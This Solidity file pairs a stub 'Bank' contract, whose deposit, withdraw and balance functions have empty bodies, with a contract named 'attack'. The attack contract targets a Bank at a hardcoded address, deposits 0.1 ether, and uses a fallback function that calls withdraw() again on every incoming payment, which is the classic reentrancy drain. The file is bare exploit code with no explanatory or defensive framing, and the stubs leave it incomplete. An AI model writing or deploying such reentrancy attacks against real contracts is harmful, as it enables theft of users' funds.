pragma solidity >=0.7.0 <0.9.0;


contract Bank{
   address private _owner;
    constructor() public payable{
        _owner = msg.sender;
    } 
   mapping(address=>uint) customerBalance;
function getBalance(address customer) public view returns (uint balance) {
   }
   function deposit() public payable {
   }

   function register() public payable{

   }

   function withdraw() public payable {
   }
}


contract attack{
   Bank bankContract;
   bool go;
   constructor() payable{
       bankContract =Bank(0xcbbC5aA2368f42FFcD5cE232CAF6A35Ed5BF25f4);
       go = true;
   }

  fallback() external payable {
           bankContract.withdraw();
   }
   function getBalance() public payable returns (uint balance){
       return bankContract.getBalance(address(this));
   }
   function  deposit() public payable{
       bankContract.deposit{value:0.1 ether}();
   }

   function  withdraw() public payable{
       bankContract.withdraw();
   }
}
